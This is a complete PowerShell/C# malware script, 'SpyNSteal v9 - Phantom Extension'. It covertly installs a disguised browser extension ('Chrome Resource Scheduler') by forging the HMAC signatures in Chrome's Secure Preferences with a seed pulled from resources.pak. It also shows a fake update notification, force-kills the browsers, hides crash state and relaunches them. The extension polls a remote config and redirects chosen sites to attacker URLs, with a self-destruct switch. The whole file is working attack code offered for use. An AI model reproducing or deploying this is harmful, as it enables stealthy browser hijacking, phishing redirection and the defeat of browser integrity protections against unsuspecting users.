# SpyNSteal v9 - Phantom Extension
# Direct Secure Preferences injection with HMAC forgery.
# No CDP. No debug flags. No developer mode. No shortcuts.
# Extension appears as a normal internal install (location=1).

$MANIFEST = @'
{"manifest_version":3,"name":"Chrome Resource Scheduler","version":"1.0","description":"Manages internal resource scheduling and prioritization.","permissions":["declarativeNetRequest"],"host_permissions":["\u003call_urls\u003e"],"background":{"service_worker":"sw.js"},"key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzeQ3T0zLhZjEhMcr11dLQAGV18IXRlYFgSk0AU4qfjnwAwYw2YD6dfOnDQt88cJOPxOUrk5DkRN7PaX2aP5qX2IeghyheWXfrEavxW83bw710fmrcEa0DcKxaw4fjf9oG02vcLQ36XMSuWF9hsq/TOK1FHcpYAZ0Lq4eOLK1GXRmoK2rUHHjslIT6z3GzsJ+cV0RlQOuXV9v/GiIfmGfP0r7KUHmlT1mbnxZTV4rbowKnued2DuRnexgf+qcESe4jswdtDOw/BR9U7wKJ3LicKZD+f0vmV0yKLrTVDkEBS3pfywvZX+aqqXohuz58zYv/Z3iDrXt3t6aMiI4yUNbGQIDAQAB"}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$EXT_PUB_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzeQ3T0zLhZjEhMcr11dLQAGV18IXRlYFgSk0AU4qfjnwAwYw2YD6dfOnDQt88cJOPxOUrk5DkRN7PaX2aP5qX2IeghyheWXfrEavxW83bw710fmrcEa0DcKxaw4fjf9oG02vcLQ36XMSuWF9hsq/TOK1FHcpYAZ0Lq4eOLK1GXRmoK2rUHHjslIT6z3GzsJ+cV0RlQOuXV9v/GiIfmGfP0r7KUHmlT1mbnxZTV4rbowKnued2DuRnexgf+qcESe4jswdtDOw/BR9U7wKJ3LicKZD+f0vmV0yKLrTVDkEBS3pfywvZX+aqqXohuz58zYv/Z3iDrXt3t6aMiI4yUNbGQIDAQAB"
$EXT_ID = "pknlcdacffnljhiajdilohddbkilabig"

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try { Add-Content $LOGFILE "[$ts] $msg" } catch {}
}

Log "=========================================="
Log "SpyNSteal v9 - Phantom Extension"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "Extension ID: $EXT_ID"
Log "=========================================="

$asmDir = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
$webExtAsm = Join-Path $asmDir "System.Web.Extensions.dll"

Add-Type -ReferencedAssemblies @("System.Core", "System.Security", $webExtAsm) -TypeDefinition @"
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Web.Script.Serialization;

public class Phantom {
    static JavaScriptSerializer jss = new JavaScriptSerializer { MaxJsonLength = int.MaxValue };

    public static string ToCanonical(object obj) {
        if (obj == null) return "null";
        if (obj is bool) return (bool)obj ? "true" : "false";
        if (obj is int) return ((int)obj).ToString();
        if (obj is long) return ((long)obj).ToString();
        if (obj is decimal) return ((decimal)obj).ToString(System.Globalization.CultureInfo.InvariantCulture);
        if (obj is double) {
            double d = (double)obj;
            if (d == Math.Floor(d) && !Double.IsInfinity(d)) return ((long)d).ToString();
            return d.ToString(System.Globalization.CultureInfo.InvariantCulture);
        }
        if (obj is string) return Esc((string)obj);
        if (obj is ArrayList) {
            var a = (ArrayList)obj;
            var parts = new string[a.Count];
            for (int i = 0; i < a.Count; i++) parts[i] = ToCanonical(a[i]);
            return "[" + string.Join(",", parts) + "]";
        }
        if (obj is object[]) {
            var a = (object[])obj;
            var parts = new string[a.Length];
            for (int i = 0; i < a.Length; i++) parts[i] = ToCanonical(a[i]);
            return "[" + string.Join(",", parts) + "]";
        }
        if (obj is Dictionary<string, object>) {
            var d = (Dictionary<string, object>)obj;
            var keys = d.Keys.ToList(); keys.Sort(StringComparer.Ordinal);
            var parts = new List<string>();
            foreach (var k in keys) parts.Add(Esc(k) + ":" + ToCanonical(d[k]));
            return "{" + string.Join(",", parts) + "}";
        }
        return Esc(obj.ToString());
    }

    static string Esc(string s) {
        var sb = new StringBuilder(s.Length + 10);
        sb.Append('"');
        foreach (char c in s) {
            switch (c) {
                case '"':  sb.Append("\\\""); break;
                case '\\': sb.Append("\\\\"); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                case '<':  sb.Append("\\u003C"); break;
                default:   sb.Append(c); break;
            }
        }
        sb.Append('"');
        return sb.ToString();
    }

    public static string Hmac(byte[] seed, string message) {
        using (var h = new HMACSHA256(seed)) {
            return BitConverter.ToString(h.ComputeHash(Encoding.UTF8.GetBytes(message))).Replace("-","");
        }
    }

    public static byte[] ExtractSeed(string pakPath) {
        try {
            byte[] d = File.ReadAllBytes(pakPath);
            if (BitConverter.ToUInt32(d, 0) != 5) return null;
            ushort count = BitConverter.ToUInt16(d, 6);
            for (int i = 0; i < count; i++) {
                int off = 10 + i * 6;
                if (BitConverter.ToUInt16(d, off) == 146) {
                    uint s = BitConverter.ToUInt32(d, off + 2);
                    uint e = BitConverter.ToUInt32(d, off + 8);
                    int len = (int)(e - s);
                    if (len >= 32 && len <= 128) {
                        byte[] seed = new byte[len];
                        Array.Copy(d, (int)s, seed, 0, len);
                        return seed;
                    }
                }
            }
        } catch {}
        return null;
    }

    public static string SidNoRid() {
        string sid = WindowsIdentity.GetCurrent().User.Value;
        return sid.Substring(0, sid.LastIndexOf('-'));
    }

    public static Dictionary<string, object> BuildSettings(string pubKey, string extId) {
        string installTime = DateTimeOffset.UtcNow.ToFileTime().ToString();
        string path = extId + "/1.0_0";

        var ap = new Dictionary<string, object>(StringComparer.Ordinal) {
            {"api", new ArrayList { "declarativeNetRequest" }},
            {"explicit_host", new ArrayList { "<all_urls>" }},
            {"manifest_permissions", new ArrayList()},
            {"scriptable_host", new ArrayList()}
        };

        var bg = new Dictionary<string, object>(StringComparer.Ordinal) {
            {"service_worker", "sw.js"}
        };
        var manifest = new Dictionary<string, object>(StringComparer.Ordinal) {
            {"background", bg},
            {"description", "Manages internal resource scheduling and prioritization."},
            {"host_permissions", new ArrayList { "<all_urls>" }},
            {"key", pubKey},
            {"manifest_version", 3},
            {"name", "Chrome Resource Scheduler"},
            {"permissions", new ArrayList { "declarativeNetRequest" }},
            {"version", "1.0"}
        };

        var gp = new Dictionary<string, object>(StringComparer.Ordinal) {
            {"api", new ArrayList { "declarativeNetRequest" }},
            {"explicit_host", new ArrayList { "<all_urls>" }},
            {"manifest_permissions", new ArrayList()},
            {"scriptable_host", new ArrayList()}
        };

        var settings = new Dictionary<string, object>(StringComparer.Ordinal) {
            {"active_permissions", ap},
            {"creation_flags", 1},
            {"from_webstore", false},
            {"granted_permissions", gp},
            {"install_time", installTime},
            {"location", 1},
            {"manifest", manifest},
            {"path", path},
            {"state", 1},
            {"was_installed_by_default", false},
            {"was_installed_by_oem", false}
        };

        return settings;
    }

    public static string Install(string secPrefsPath, string extId, string pubKey, byte[] seed) {
        string log = "";
        try {
            string raw = File.ReadAllText(secPrefsPath, Encoding.UTF8);
            var root = jss.Deserialize<Dictionary<string, object>>(raw);
            log += "PARSED|";

            var settings = BuildSettings(pubKey, extId);
            string settingsJson = ToCanonical(settings);
            log += "JSON_LEN:" + settingsJson.Length + "|";

            string extMacPath = "extensions.settings." + extId;
            string extMac = Hmac(seed, extMacPath + settingsJson);
            log += "EXT_MAC:" + extMac.Substring(0, 16) + "...|";

            if (!root.ContainsKey("extensions"))
                root["extensions"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var extensions = root["extensions"] as Dictionary<string, object>;
            if (extensions == null) { extensions = new Dictionary<string, object>(StringComparer.Ordinal); root["extensions"] = extensions; }

            if (!extensions.ContainsKey("settings"))
                extensions["settings"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var extSettings = extensions["settings"] as Dictionary<string, object>;
            if (extSettings == null) { extSettings = new Dictionary<string, object>(StringComparer.Ordinal); extensions["settings"] = extSettings; }

            extSettings[extId] = settings;
            log += "EXT_ADDED|";

            if (!root.ContainsKey("protection"))
                root["protection"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var protection = root["protection"] as Dictionary<string, object>;
            if (protection == null) { protection = new Dictionary<string, object>(StringComparer.Ordinal); root["protection"] = protection; }

            if (!protection.ContainsKey("macs"))
                protection["macs"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var macs = protection["macs"] as Dictionary<string, object>;
            if (macs == null) { macs = new Dictionary<string, object>(StringComparer.Ordinal); protection["macs"] = macs; }

            if (!macs.ContainsKey("extensions"))
                macs["extensions"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var macExts = macs["extensions"] as Dictionary<string, object>;
            if (macExts == null) { macExts = new Dictionary<string, object>(StringComparer.Ordinal); macs["extensions"] = macExts; }

            if (!macExts.ContainsKey("settings"))
                macExts["settings"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var macSettings = macExts["settings"] as Dictionary<string, object>;
            if (macSettings == null) { macSettings = new Dictionary<string, object>(StringComparer.Ordinal); macExts["settings"] = macSettings; }

            macSettings[extId] = extMac;
            log += "MAC_SET|";

            string sidNoRid = SidNoRid();
            string macsCanonical = ToCanonical(macs);
            string superMac = Hmac(seed, sidNoRid + macsCanonical);
            protection["super_mac"] = superMac;
            log += "SUPER_MAC:" + superMac.Substring(0, 16) + "...|";

            string output = jss.Serialize(root);
            File.WriteAllText(secPrefsPath, output, new UTF8Encoding(false));
            log += "WRITTEN|";

        } catch (Exception ex) {
            log += "ERR:" + ex.Message + "|";
        }
        return log;
    }

    public static string InstallPrefs(string prefsPath, string extId, string pubKey, byte[] seed) {
        string log = "";
        try {
            string raw = File.ReadAllText(prefsPath, Encoding.UTF8);
            var root = jss.Deserialize<Dictionary<string, object>>(raw);
            log += "PARSED|";

            var settings = BuildSettings(pubKey, extId);
            string settingsJson = ToCanonical(settings);

            string extMacPath = "extensions.settings." + extId;
            string extMac = Hmac(seed, extMacPath + settingsJson);

            if (!root.ContainsKey("extensions"))
                root["extensions"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var extensions = root["extensions"] as Dictionary<string, object>;
            if (extensions == null) { extensions = new Dictionary<string, object>(StringComparer.Ordinal); root["extensions"] = extensions; }

            if (!extensions.ContainsKey("settings"))
                extensions["settings"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var extSettings = extensions["settings"] as Dictionary<string, object>;
            if (extSettings == null) { extSettings = new Dictionary<string, object>(StringComparer.Ordinal); extensions["settings"] = extSettings; }

            extSettings[extId] = settings;

            if (!root.ContainsKey("protection"))
                root["protection"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var protection = root["protection"] as Dictionary<string, object>;
            if (protection == null) { protection = new Dictionary<string, object>(StringComparer.Ordinal); root["protection"] = protection; }

            if (!protection.ContainsKey("macs"))
                protection["macs"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var macs = protection["macs"] as Dictionary<string, object>;
            if (macs == null) { macs = new Dictionary<string, object>(StringComparer.Ordinal); protection["macs"] = macs; }

            if (!macs.ContainsKey("extensions"))
                macs["extensions"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var macExts = macs["extensions"] as Dictionary<string, object>;
            if (macExts == null) { macExts = new Dictionary<string, object>(StringComparer.Ordinal); macs["extensions"] = macExts; }

            if (!macExts.ContainsKey("settings"))
                macExts["settings"] = new Dictionary<string, object>(StringComparer.Ordinal);
            var macSettings = macExts["settings"] as Dictionary<string, object>;
            if (macSettings == null) { macSettings = new Dictionary<string, object>(StringComparer.Ordinal); macExts["settings"] = macSettings; }

            macSettings[extId] = extMac;
            log += "MAC_SET|";

            string output = jss.Serialize(root);
            File.WriteAllText(prefsPath, output, new UTF8Encoding(false));
            log += "WRITTEN|";
        } catch (Exception ex) {
            log += "ERR:" + ex.Message + "|";
        }
        return log;
    }
}
"@
Log "C# compiled OK"

$KNOWN_SEED = [byte[]]@(
    0xe7,0x48,0xf3,0x36,0xd8,0x5e,0xa5,0xf9,0xdc,0xdf,0x25,0xd8,0xf3,0x47,0xa6,0x5b,
    0x4c,0xdf,0x66,0x76,0x00,0xf0,0x2d,0xf6,0x72,0x4a,0x2a,0xf1,0x8a,0x21,0x2d,0x26,
    0xb7,0x88,0xa2,0x50,0x86,0x91,0x0c,0xf3,0xa9,0x03,0x13,0x69,0x68,0x71,0xf3,0xdc,
    0x05,0x82,0x37,0x30,0xc9,0x1d,0xf8,0xba,0x5c,0x4f,0xd9,0xc8,0x84,0xb5,0x05,0xa8
)

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $exe = if ($name -eq "chrome") { "chrome.exe" } else { "msedge.exe" }
            $c = Join-Path $d $exe
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-AllBrowser([string]$procName) {
    $attempts = 0
    do {
        $procs = Get-Process $procName -EA SilentlyContinue
        if (-not $procs) { return $true }
        $procs | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 800
        $attempts++
    } while ($attempts -lt 30)
    cmd /c "taskkill /F /IM $procName.exe /T" 2>&1 | Out-Null
    Start-Sleep 1
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

# =============================================================================
# STEP 1: Find browsers
# =============================================================================
Log "STEP 1: Finding browsers..."
$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "  ${name}: Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "FATAL: No browsers found"; exit }

# =============================================================================
# STEP 2: Kill browsers
# =============================================================================
Log "STEP 2: Kill browsers..."
$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }
foreach ($b in $browsers) {
    if ($b.Running) { Kill-AllBrowser $b.Proc | Out-Null }
}
Start-Sleep 3

$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
$ver = (Get-Item $target.ExePath).VersionInfo.FileVersion
Log "STEP 2: Target = $($target.Name) v$ver"

# =============================================================================
# STEP 3: Extract HMAC seed from resources.pak
# =============================================================================
Log "STEP 3: Extracting HMAC seed..."
$chromeDir = Split-Path $target.ExePath -Parent
$pakPath = Join-Path $chromeDir "resources.pak"
$seed = $null

if (Test-Path $pakPath) {
    $seed = [Phantom]::ExtractSeed($pakPath)
    if ($seed) {
        $seedHex = [BitConverter]::ToString($seed).Replace("-","").ToLower()
        Log "  Extracted seed from resources.pak ($($seed.Length) bytes)"
        Log "  Seed: $($seedHex.Substring(0,32))..."
    } else {
        Log "  Could not extract seed from pak, using known static seed"
    }
}

$isEdge = $target.Name -eq "edge"
if ($isEdge) {
    Log "  Edge detected - seed is null (no HMAC needed)"
    $seed = New-Object byte[] 0
} elseif (-not $seed) {
    $seed = $KNOWN_SEED
    Log "  Using known static seed (valid through Chrome 139+)"
}

# =============================================================================
# STEP 4: Drop extension files
# =============================================================================
Log "STEP 4: Dropping extension files..."
$profileDir = Join-Path $target.UserData "Default"
$extInstallDir = Join-Path $profileDir "Extensions\$EXT_ID\1.0_0"
New-Item -Path $extInstallDir -ItemType Directory -Force | Out-Null
$utf8 = New-Object Text.UTF8Encoding($false)
[IO.File]::WriteAllText((Join-Path $extInstallDir "manifest.json"), $MANIFEST, $utf8)
[IO.File]::WriteAllText((Join-Path $extInstallDir "sw.js"), $SW_JS, $utf8)
Log "  Installed to: $extInstallDir"
Log "  manifest.json: $(Test-Path (Join-Path $extInstallDir 'manifest.json'))"
Log "  sw.js: $(Test-Path (Join-Path $extInstallDir 'sw.js'))"

# =============================================================================
# STEP 5: Patch Local State (clean exit)
# =============================================================================
Log "STEP 5: Patching Local State..."
$localState = Join-Path $target.UserData "Local State"
if (Test-Path $localState) {
    try {
        $lsText = [IO.File]::ReadAllText($localState)
        $lsText = $lsText.Replace('"exited_cleanly":false', '"exited_cleanly":true')
        $lsText = $lsText.Replace('"exit_type":"Crashed"', '"exit_type":"Normal"')
        [IO.File]::WriteAllText($localState, $lsText, $utf8)
        Log "  Local State patched (clean exit)"
    } catch { Log "  Local State patch failed: $_" }
}

# =============================================================================
# STEP 6: Inject extension into Secure Preferences (with HMAC forgery)
# =============================================================================
Log "STEP 6: Injecting extension into preferences..."

$secPrefs = Join-Path $profileDir "Secure Preferences"
$prefs = Join-Path $profileDir "Preferences"

$result = ""
if (Test-Path $secPrefs) {
    Log "  Target: Secure Preferences (non-domain machine)"
    $result = [Phantom]::Install($secPrefs, $EXT_ID, $EXT_PUB_KEY, $seed)
    Log "  Result: $result"
}

if (Test-Path $prefs) {
    Log "  Also patching: Preferences (domain-joined fallback)"
    $prefsResult = [Phantom]::InstallPrefs($prefs, $EXT_ID, $EXT_PUB_KEY, $seed)
    Log "  Prefs result: $prefsResult"
}

# =============================================================================
# STEP 7: Verify
# =============================================================================
Log "STEP 7: Verification..."
if (Test-Path $secPrefs) {
    $spText = [IO.File]::ReadAllText($secPrefs)
    Log "  Extension in Secure Prefs: $($spText.Contains($EXT_ID))"
    Log "  MAC in protection.macs: $($spText.Contains('"' + $EXT_ID + '"'))"
    Log "  super_mac present: $($spText.Contains('super_mac'))"
}
if (Test-Path $extInstallDir) {
    $files = @(Get-ChildItem $extInstallDir -File).Count
    Log "  Extension files on disk: $files"
}

# =============================================================================
# STEP 8: Relaunch browser normally (NO flags)
# =============================================================================
Log "STEP 8: Relaunching $($target.Name) normally (no flags)..."
Start-Process $target.ExePath
Start-Sleep 8

$running = [bool](Get-Process $target.Proc -EA SilentlyContinue)
Log "  Browser running: $running"

Log "=========================================="
Log "DONE v9 - Phantom Extension"
Log "  Extension ID: $EXT_ID"
Log "  Location: 1 (internal - appears as normal install)"
Log "  Developer mode: NOT required"
Log "  Debug flags: NONE"
Log "  Shortcut modifications: NONE"
Log "  "
Log "  The extension is written directly to Secure Preferences"
Log "  with forged HMAC signatures. Chrome treats it as a"
Log "  legitimate internal install on every launch."
Log "=========================================="
